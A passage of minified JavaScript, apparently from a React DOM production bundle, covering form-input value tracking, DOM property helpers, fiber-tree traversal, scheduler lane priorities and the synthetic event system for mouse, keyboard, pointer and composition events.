    }
}
function Mi(e) {
    e._valueTracker || (e._valueTracker = hy(e))
}
function sm(e) {
    if (!e)
        return !1;
    var t = e._valueTracker;
    if (!t)
        return !0;
    var n = t.getValue()
      , r = "";
    return e && (r = im(e) ? e.checked ? "true" : "false" : e.value),
    e = r,
    e !== n ? (t.setValue(e),
    !0) : !1
}
function vs(e) {
    if (e = e || (typeof document < "u" ? document : void 0),
    typeof e > "u")
        return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}
function Eu(e, t) {
    var n = t.checked;
    return xt({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked
    })
}
function vd(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue
      , r = t.checked != null ? t.checked : t.defaultChecked;
    n = Er(t.value != null ? t.value : n),
    e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}
function lm(e, t) {
    t = t.checked,
    t != null && Xc(e, "checked", t, !1)
}
function _u(e, t) {
    lm(e, t);
    var n = Er(t.value)
      , r = t.type;
    if (n != null)
        r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return
    }
    t.hasOwnProperty("value") ? Tu(e, t.type, n) : t.hasOwnProperty("defaultValue") && Tu(e, t.type, Er(t.defaultValue)),
    t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}
function xd(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null))
            return;
        t = "" + e._wrapperState.initialValue,
        n || t === e.value || (e.value = t),
        e.defaultValue = t
    }
    n = e.name,
    n !== "" && (e.name = ""),
    e.defaultChecked = !!e._wrapperState.initialChecked,
    n !== "" && (e.name = n)
}
function Tu(e, t, n) {
    (t !== "number" || vs(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var Eo = Array.isArray;
function Ia(e, t, n, r) {
    if (e = e.options,
    t) {
        t = {};
        for (var a = 0; a < n.length; a++)
            t["$" + n[a]] = !0;
        for (n = 0; n < e.length; n++)
            a = t.hasOwnProperty("$" + e[n].value),
            e[n].selected !== a && (e[n].selected = a),
            a && r && (e[n].defaultSelected = !0)
    } else {
        for (n = "" + Er(n),
        t = null,
        a = 0; a < e.length; a++) {
            if (e[a].value === n) {
                e[a].selected = !0,
                r && (e[a].defaultSelected = !0);
                return
            }
            t !== null || e[a].disabled || (t = e[a])
        }
        t !== null && (t.selected = !0)
    }
}
function Pu(e, t) {
    if (t.dangerouslySetInnerHTML != null)
        throw Error(G(91));
    return xt({}, t, {
        value: void 0,
        defaultValue: void 0,
        children: "" + e._wrapperState.initialValue
    })
}
function wd(e, t) {
    var n = t.value;
    if (n == null) {
        if (n = t.children,
        t = t.defaultValue,
        n != null) {
            if (t != null)
                throw Error(G(92));
            if (Eo(n)) {
                if (1 < n.length)
                    throw Error(G(93));
                n = n[0]
            }
            t = n
        }
        t == null && (t = ""),
        n = t
    }
    e._wrapperState = {
        initialValue: Er(n)
    }
}
function um(e, t) {
    var n = Er(t.value)
      , r = Er(t.defaultValue);
    n != null && (n = "" + n,
    n !== e.value && (e.value = n),
    t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
    r != null && (e.defaultValue = "" + r)
}
function bd(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
}
function cm(e) {
    switch (e) {
    case "svg":
        return "http://www.w3.org/2000/svg";
    case "math":
        return "http://www.w3.org/1998/Math/MathML";
    default:
        return "http://www.w3.org/1999/xhtml"
    }
}
function Ou(e, t) {
    return e == null || e === "http://www.w3.org/1999/xhtml" ? cm(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
}
var Di, fm = function(e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function(t, n, r, a) {
        MSApp.execUnsafeLocalFunction(function() {
            return e(t, n, r, a)
        })
    }
    : e
}(function(e, t) {
    if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML"in e)
        e.innerHTML = t;
    else {
        for (Di = Di || document.createElement("div"),
        Di.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
        t = Di.firstChild; e.firstChild; )
            e.removeChild(e.firstChild);
        for (; t.firstChild; )
            e.appendChild(t.firstChild)
    }
});
function Ko(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
            n.nodeValue = t;
            return
        }
    }
    e.textContent = t
}
var Ao = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0
}
  , my = ["Webkit", "ms", "Moz", "O"];
Object.keys(Ao).forEach(function(e) {
    my.forEach(function(t) {
        t = t + e.charAt(0).toUpperCase() + e.substring(1),
        Ao[t] = Ao[e]
    })
});
function dm(e, t, n) {
    return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || Ao.hasOwnProperty(e) && Ao[e] ? ("" + t).trim() : t + "px"
}
function pm(e, t) {
    e = e.style;
    for (var n in t)
        if (t.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0
              , a = dm(n, t[n], r);
            n === "float" && (n = "cssFloat"),
            r ? e.setProperty(n, a) : e[n] = a
        }
}
var gy = xt({
    menuitem: !0
}, {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0
});
function Ru(e, t) {
    if (t) {
        if (gy[e] && (t.children != null || t.dangerouslySetInnerHTML != null))
            throw Error(G(137, e));
        if (t.dangerouslySetInnerHTML != null) {
            if (t.children != null)
                throw Error(G(60));
            if (typeof t.dangerouslySetInnerHTML != "object" || !("__html"in t.dangerouslySetInnerHTML))
                throw Error(G(61))
        }
        if (t.style != null && typeof t.style != "object")
            throw Error(G(62))
    }
}
function Au(e, t) {
    if (e.indexOf("-") === -1)
        return typeof t.is == "string";
    switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
        return !1;
    default:
        return !0
    }
}
var Lu = null;
function ef(e) {
    return e = e.target || e.srcElement || window,
    e.correspondingUseElement && (e = e.correspondingUseElement),
    e.nodeType === 3 ? e.parentNode : e
}
var Iu = null
  , Ma = null
  , Da = null;
function Sd(e) {
    if (e = vi(e)) {
        if (typeof Iu != "function")
            throw Error(G(280));
        var t = e.stateNode;
        t && (t = sl(t),
        Iu(e.stateNode, e.type, t))
    }
}
function hm(e) {
    Ma ? Da ? Da.push(e) : Da = [e] : Ma = e
}
function mm() {
    if (Ma) {
        var e = Ma
          , t = Da;
        if (Da = Ma = null,
        Sd(e),
        t)
            for (e = 0; e < t.length; e++)
                Sd(t[e])
    }
}
function gm(e, t) {
    return e(t)
}
function ym() {}
var zl = !1;
function vm(e, t, n) {
    if (zl)
        return e(t, n);
    zl = !0;
    try {
        return gm(e, t, n)
    } finally {
        zl = !1,
        (Ma !== null || Da !== null) && (ym(),
        mm())
    }
}
function Go(e, t) {
    var n = e.stateNode;
    if (n === null)
        return null;
    var r = sl(n);
    if (r === null)
        return null;
    n = r[t];
    e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
        (r = !r.disabled) || (e = e.type,
        r = !(e === "button" || e === "input" || e === "select" || e === "textarea")),
        e = !r;
        break e;
    default:
        e = !1
    }
    if (e)
        return null;
    if (n && typeof n != "function")
        throw Error(G(231, t, typeof n));
    return n
}
var Mu = !1;
if (Yn)
    try {
        var po = {};
        Object.defineProperty(po, "passive", {
            get: function() {
                Mu = !0
            }
        }),
        window.addEventListener("test", po, po),
        window.removeEventListener("test", po, po)
    } catch {
        Mu = !1
    }
function yy(e, t, n, r, a, o, i, s, u) {
    var c = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, c)
    } catch (f) {
        this.onError(f)
    }
}
var Lo = !1
  , xs = null
  , ws = !1
  , Du = null
  , vy = {
    onError: function(e) {
        Lo = !0,
        xs = e
    }
};
function xy(e, t, n, r, a, o, i, s, u) {
    Lo = !1,
    xs = null,
    yy.apply(vy, arguments)
}
function wy(e, t, n, r, a, o, i, s, u) {
    if (xy.apply(this, arguments),
    Lo) {
        if (Lo) {
            var c = xs;
            Lo = !1,
            xs = null
        } else
            throw Error(G(198));
        ws || (ws = !0,
        Du = c)
    }
}
function pa(e) {
    var t = e
      , n = e;
    if (e.alternate)
        for (; t.return; )
            t = t.return;
    else {
        e = t;
        do
            t = e,
            t.flags & 4098 && (n = t.return),
            e = t.return;
        while (e)
    }
    return t.tag === 3 ? n : null
}
function xm(e) {
    if (e.tag === 13) {
        var t = e.memoizedState;
        if (t === null && (e = e.alternate,
        e !== null && (t = e.memoizedState)),
        t !== null)
            return t.dehydrated
    }
    return null
}
function Nd(e) {
    if (pa(e) !== e)
        throw Error(G(188))
}
function by(e) {
    var t = e.alternate;
    if (!t) {
        if (t = pa(e),
        t === null)
            throw Error(G(188));
        return t !== e ? null : e
    }
    for (var n = e, r = t; ; ) {
        var a = n.return;
        if (a === null)
            break;
        var o = a.alternate;
        if (o === null) {
            if (r = a.return,
            r !== null) {
                n = r;
                continue
            }
            break
        }
        if (a.child === o.child) {
            for (o = a.child; o; ) {
                if (o === n)
                    return Nd(a),
                    e;
                if (o === r)
                    return Nd(a),
                    t;
                o = o.sibling
            }
            throw Error(G(188))
        }
        if (n.return !== r.return)
            n = a,
            r = o;
        else {
            for (var i = !1, s = a.child; s; ) {
                if (s === n) {
                    i = !0,
                    n = a,
                    r = o;
                    break
                }
                if (s === r) {
                    i = !0,
                    r = a,
                    n = o;
                    break
                }
                s = s.sibling
            }
            if (!i) {
                for (s = o.child; s; ) {
                    if (s === n) {
                        i = !0,
                        n = o,
                        r = a;
                        break
                    }
                    if (s === r) {
                        i = !0,
                        r = o,
                        n = a;
                        break
                    }
                    s = s.sibling
                }
                if (!i)
                    throw Error(G(189))
            }
        }
        if (n.alternate !== r)
            throw Error(G(190))
    }
    if (n.tag !== 3)
        throw Error(G(188));
    return n.stateNode.current === n ? e : t
}
function wm(e) {
    return e = by(e),
    e !== null ? bm(e) : null
}
function bm(e) {
    if (e.tag === 5 || e.tag === 6)
        return e;
    for (e = e.child; e !== null; ) {
        var t = bm(e);
        if (t !== null)
            return t;
        e = e.sibling
    }
    return null
}
var Sm = fn.unstable_scheduleCallback
  , Cd = fn.unstable_cancelCallback
  , Sy = fn.unstable_shouldYield
  , Ny = fn.unstable_requestPaint
  , Ct = fn.unstable_now
  , Cy = fn.unstable_getCurrentPriorityLevel
  , tf = fn.unstable_ImmediatePriority
  , Nm = fn.unstable_UserBlockingPriority
  , bs = fn.unstable_NormalPriority
  , ky = fn.unstable_LowPriority
  , Cm = fn.unstable_IdlePriority
  , rl = null
  , Dn = null;
function jy(e) {
    if (Dn && typeof Dn.onCommitFiberRoot == "function")
        try {
            Dn.onCommitFiberRoot(rl, e, void 0, (e.current.flags & 128) === 128)
        } catch {}
}
var En = Math.clz32 ? Math.clz32 : Ty
  , Ey = Math.log
  , _y = Math.LN2;
function Ty(e) {
    return e >>>= 0,
    e === 0 ? 32 : 31 - (Ey(e) / _y | 0) | 0
}
var zi = 64
  , Fi = 4194304;
function _o(e) {
    switch (e & -e) {
    case 1:
        return 1;
    case 2:
        return 2;
    case 4:
        return 4;
    case 8:
        return 8;
    case 16:
        return 16;
    case 32:
        return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
        return e & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
        return e & 130023424;
    case 134217728:
        return 134217728;
    case 268435456:
        return 268435456;
    case 536870912:
        return 536870912;
    case 1073741824:
        return 1073741824;
    default:
        return e
    }
}
function Ss(e, t) {
    var n = e.pendingLanes;
    if (n === 0)
        return 0;
    var r = 0
      , a = e.suspendedLanes
      , o = e.pingedLanes
      , i = n & 268435455;
    if (i !== 0) {
        var s = i & ~a;
        s !== 0 ? r = _o(s) : (o &= i,
        o !== 0 && (r = _o(o)))
    } else
        i = n & ~a,
        i !== 0 ? r = _o(i) : o !== 0 && (r = _o(o));
    if (r === 0)
        return 0;
    if (t !== 0 && t !== r && !(t & a) && (a = r & -r,
    o = t & -t,
    a >= o || a === 16 && (o & 4194240) !== 0))
        return t;
    if (r & 4 && (r |= n & 16),
    t = e.entangledLanes,
    t !== 0)
        for (e = e.entanglements,
        t &= r; 0 < t; )
            n = 31 - En(t),
            a = 1 << n,
            r |= e[n],
            t &= ~a;
    return r
}
function Py(e, t) {
    switch (e) {
    case 1:
    case 2:
    case 4:
        return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
        return t + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
        return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
        return -1;
    default:
        return -1
    }
}
function Oy(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, a = e.expirationTimes, o = e.pendingLanes; 0 < o; ) {
        var i = 31 - En(o)
          , s = 1 << i
          , u = a[i];
        u === -1 ? (!(s & n) || s & r) && (a[i] = Py(s, t)) : u <= t && (e.expiredLanes |= s),
        o &= ~s
    }
}
function zu(e) {
    return e = e.pendingLanes & -1073741825,
    e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
}
function km() {
    var e = zi;
    return zi <<= 1,
    !(zi & 4194240) && (zi = 64),
    e
}
function Fl(e) {
    for (var t = [], n = 0; 31 > n; n++)
        t.push(e);
    return t
}
function gi(e, t, n) {
    e.pendingLanes |= t,
    t !== 536870912 && (e.suspendedLanes = 0,
    e.pingedLanes = 0),
    e = e.eventTimes,
    t = 31 - En(t),
    e[t] = n
}
function Ry(e, t) {
    var n = e.pendingLanes & ~t;
    e.pendingLanes = t,
    e.suspendedLanes = 0,
    e.pingedLanes = 0,
    e.expiredLanes &= t,
    e.mutableReadLanes &= t,
    e.entangledLanes &= t,
    t = e.entanglements;
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n; ) {
        var a = 31 - En(n)
          , o = 1 << a;
        t[a] = 0,
        r[a] = -1,
        e[a] = -1,
        n &= ~o
    }
}
function nf(e, t) {
    var n = e.entangledLanes |= t;
    for (e = e.entanglements; n; ) {
        var r = 31 - En(n)
          , a = 1 << r;
        a & t | e[r] & t && (e[r] |= t),
        n &= ~a
    }
}
var Je = 0;
function jm(e) {
    return e &= -e,
    1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
}
var Em, rf, _m, Tm, Pm, Fu = !1, Ui = [], xr = null, wr = null, br = null, Yo = new Map, Qo = new Map, pr = [], Ay = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
function kd(e, t) {
    switch (e) {
    case "focusin":
    case "focusout":
        xr = null;
        break;
    case "dragenter":
    case "dragleave":
        wr = null;
        break;
    case "mouseover":
    case "mouseout":
        br = null;
        break;
    case "pointerover":
    case "pointerout":
        Yo.delete(t.pointerId);
        break;
    case "gotpointercapture":
    case "lostpointercapture":
        Qo.delete(t.pointerId)
    }
}
function ho(e, t, n, r, a, o) {
    return e === null || e.nativeEvent !== o ? (e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: o,
        targetContainers: [a]
    },
    t !== null && (t = vi(t),
    t !== null && rf(t)),
    e) : (e.eventSystemFlags |= r,
    t = e.targetContainers,
    a !== null && t.indexOf(a) === -1 && t.push(a),
    e)
}
function Ly(e, t, n, r, a) {
    switch (t) {
    case "focusin":
        return xr = ho(xr, e, t, n, r, a),
        !0;
    case "dragenter":
        return wr = ho(wr, e, t, n, r, a),
        !0;
    case "mouseover":
        return br = ho(br, e, t, n, r, a),
        !0;
    case "pointerover":
        var o = a.pointerId;
        return Yo.set(o, ho(Yo.get(o) || null, e, t, n, r, a)),
        !0;
    case "gotpointercapture":
        return o = a.pointerId,
        Qo.set(o, ho(Qo.get(o) || null, e, t, n, r, a)),
        !0
    }
    return !1
}
function Om(e) {
    var t = Wr(e.target);
    if (t !== null) {
        var n = pa(t);
        if (n !== null) {
            if (t = n.tag,
            t === 13) {
                if (t = xm(n),
                t !== null) {
                    e.blockedOn = t,
                    Pm(e.priority, function() {
                        _m(n)
                    });
                    return
                }
            } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return
            }
        }
    }
    e.blockedOn = null
}
function ns(e) {
    if (e.blockedOn !== null)
        return !1;
    for (var t = e.targetContainers; 0 < t.length; ) {
        var n = Uu(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (n === null) {
            n = e.nativeEvent;
            var r = new n.constructor(n.type,n);
            Lu = r,
            n.target.dispatchEvent(r),
            Lu = null
        } else
            return t = vi(n),
            t !== null && rf(t),
            e.blockedOn = n,
            !1;
        t.shift()
    }
    return !0
}
function jd(e, t, n) {
    ns(e) && n.delete(t)
}
function Iy() {
    Fu = !1,
    xr !== null && ns(xr) && (xr = null),
    wr !== null && ns(wr) && (wr = null),
    br !== null && ns(br) && (br = null),
    Yo.forEach(jd),
    Qo.forEach(jd)
}
function mo(e, t) {
    e.blockedOn === t && (e.blockedOn = null,
    Fu || (Fu = !0,
    fn.unstable_scheduleCallback(fn.unstable_NormalPriority, Iy)))
}
function Xo(e) {
    function t(a) {
        return mo(a, e)
    }
    if (0 < Ui.length) {
        mo(Ui[0], e);
        for (var n = 1; n < Ui.length; n++) {
            var r = Ui[n];
            r.blockedOn === e && (r.blockedOn = null)
        }
    }
    for (xr !== null && mo(xr, e),
    wr !== null && mo(wr, e),
    br !== null && mo(br, e),
    Yo.forEach(t),
    Qo.forEach(t),
    n = 0; n < pr.length; n++)
        r = pr[n],
        r.blockedOn === e && (r.blockedOn = null);
    for (; 0 < pr.length && (n = pr[0],
    n.blockedOn === null); )
        Om(n),
        n.blockedOn === null && pr.shift()
}
var za = er.ReactCurrentBatchConfig
  , Ns = !0;
function My(e, t, n, r) {
    var a = Je
      , o = za.transition;
    za.transition = null;
    try {
        Je = 1,
        af(e, t, n, r)
    } finally {
        Je = a,
        za.transition = o
    }
}
function Dy(e, t, n, r) {
    var a = Je
      , o = za.transition;
    za.transition = null;
    try {
        Je = 4,
        af(e, t, n, r)
    } finally {
        Je = a,
        za.transition = o
    }
}
function af(e, t, n, r) {
    if (Ns) {
        var a = Uu(e, t, n, r);
        if (a === null)
            Ql(e, t, r, Cs, n),
            kd(e, r);
        else if (Ly(a, e, t, n, r))
            r.stopPropagation();
        else if (kd(e, r),
        t & 4 && -1 < Ay.indexOf(e)) {
            for (; a !== null; ) {
                var o = vi(a);
                if (o !== null && Em(o),
                o = Uu(e, t, n, r),
                o === null && Ql(e, t, r, Cs, n),
                o === a)
                    break;
                a = o
            }
            a !== null && r.stopPropagation()
        } else
            Ql(e, t, r, null, n)
    }
}
var Cs = null;
function Uu(e, t, n, r) {
    if (Cs = null,
    e = ef(r),
    e = Wr(e),
    e !== null)
        if (t = pa(e),
        t === null)
            e = null;
        else if (n = t.tag,
        n === 13) {
            if (e = xm(t),
            e !== null)
                return e;
            e = null
        } else if (n === 3) {
            if (t.stateNode.current.memoizedState.isDehydrated)
                return t.tag === 3 ? t.stateNode.containerInfo : null;
            e = null
        } else
            t !== e && (e = null);
    return Cs = e,
    null
}
function Rm(e) {
    switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
        return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
        return 4;
    case "message":
        switch (Cy()) {
        case tf:
            return 1;
        case Nm:
            return 4;
        case bs:
        case ky:
            return 16;
        case Cm:
            return 536870912;
        default:
            return 16
        }
    default:
        return 16
    }
}
var mr = null
  , of = null
  , rs = null;
function Am() {
    if (rs)
        return rs;
    var e, t = of, n = t.length, r, a = "value"in mr ? mr.value : mr.textContent, o = a.length;
    for (e = 0; e < n && t[e] === a[e]; e++)
        ;
    var i = n - e;
    for (r = 1; r <= i && t[n - r] === a[o - r]; r++)
        ;
    return rs = a.slice(e, 1 < r ? 1 - r : void 0)
}
function as(e) {
    var t = e.keyCode;
    return "charCode"in e ? (e = e.charCode,
    e === 0 && t === 13 && (e = 13)) : e = t,
    e === 10 && (e = 13),
    32 <= e || e === 13 ? e : 0
}
function Bi() {
    return !0
}
function Ed() {
    return !1
}
function pn(e) {
    function t(n, r, a, o, i) {
        this._reactName = n,
        this._targetInst = a,
        this.type = r,
        this.nativeEvent = o,
        this.target = i,
        this.currentTarget = null;
        for (var s in e)
            e.hasOwnProperty(s) && (n = e[s],
            this[s] = n ? n(o) : o[s]);
        return this.isDefaultPrevented = (o.defaultPrevented != null ? o.defaultPrevented : o.returnValue === !1) ? Bi : Ed,
        this.isPropagationStopped = Ed,
        this
    }
    return xt(t.prototype, {
        preventDefault: function() {
            this.defaultPrevented = !0;
            var n = this.nativeEvent;
            n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1),
            this.isDefaultPrevented = Bi)
        },
        stopPropagation: function() {
            var n = this.nativeEvent;
            n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
            this.isPropagationStopped = Bi)
        },
        persist: function() {},
        isPersistent: Bi
    }),
    t
}
var Za = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function(e) {
        return e.timeStamp || Date.now()
    },
    defaultPrevented: 0,
    isTrusted: 0
}, sf = pn(Za), yi = xt({}, Za, {
    view: 0,
    detail: 0
}), zy = pn(yi), Ul, Bl, go, al = xt({}, yi, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: lf,
    button: 0,
    buttons: 0,
    relatedTarget: function(e) {
        return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
    },
    movementX: function(e) {
        return "movementX"in e ? e.movementX : (e !== go && (go && e.type === "mousemove" ? (Ul = e.screenX - go.screenX,
        Bl = e.screenY - go.screenY) : Bl = Ul = 0,
        go = e),
        Ul)
    },
    movementY: function(e) {
        return "movementY"in e ? e.movementY : Bl
    }
}), _d = pn(al), Fy = xt({}, al, {
    dataTransfer: 0
}), Uy = pn(Fy), By = xt({}, yi, {
    relatedTarget: 0
}), $l = pn(By), $y = xt({}, Za, {
    animationName: 0,
    elapsedTime: 0,
    pseudoElement: 0
}), Hy = pn($y), Vy = xt({}, Za, {
    clipboardData: function(e) {
        return "clipboardData"in e ? e.clipboardData : window.clipboardData
    }
}), Wy = pn(Vy), Ky = xt({}, Za, {
    data: 0
}), Td = pn(Ky), Gy = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified"
}, Yy = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta"
}, Qy = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey"
};
function Xy(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : (e = Qy[e]) ? !!t[e] : !1
}
function lf() {
    return Xy
}
var qy = xt({}, yi, {
    key: function(e) {
        if (e.key) {
            var t = Gy[e.key] || e.key;
            if (t !== "Unidentified")
                return t
        }
        return e.type === "keypress" ? (e = as(e),
        e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? Yy[e.keyCode] || "Unidentified" : ""
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: lf,
    charCode: function(e) {
        return e.type === "keypress" ? as(e) : 0
    },
    keyCode: function(e) {
        return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
    },
    which: function(e) {
        return e.type === "keypress" ? as(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
    }
})
  , Jy = pn(qy)
  , Zy = xt({}, al, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0
})
  , Pd = pn(Zy)
  , ev = xt({}, yi, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: lf
})
  , tv = pn(ev)
  , nv = xt({}, Za, {
    propertyName: 0,
    elapsedTime: 0,
    pseudoElement: 0
})
  , rv = pn(nv)
  , av = xt({}, al, {
    deltaX: function(e) {
        return "deltaX"in e ? e.deltaX : "wheelDeltaX"in e ? -e.wheelDeltaX : 0
    },
    deltaY: function(e) {
        return "deltaY"in e ? e.deltaY : "wheelDeltaY"in e ? -e.wheelDeltaY : "wheelDelta"in e ? -e.wheelDelta : 0
    },
    deltaZ: 0,
    deltaMode: 0
})
  , ov = pn(av)
  , iv = [9, 13, 27, 32]
  , uf = Yn && "CompositionEvent"in window
  , Io = null;
Yn && "documentMode"in document && (Io = document.documentMode);
var sv = Yn && "TextEvent"in window && !Io
  , Lm = Yn && (!uf || Io && 8 < Io && 11 >= Io)
  , Od = " "
  , Rd = !1;
function Im(e, t) {
    switch (e) {
    case "keyup":
        return iv.indexOf(t.keyCode) !== -1;
    case "keydown":
        return t.keyCode !== 229;
    case "keypress":
    case "mousedown":
    case "focusout":
        return !0;
    default:
        return !1
    }
}
function Mm(e) {
    return e = e.detail,
    typeof e == "object" && "data"in e ? e.data : null
}
var Na = !1;
function lv(e, t) {
    switch (e) {
    case "compositionend":
        return Mm(t);
    case "keypress":
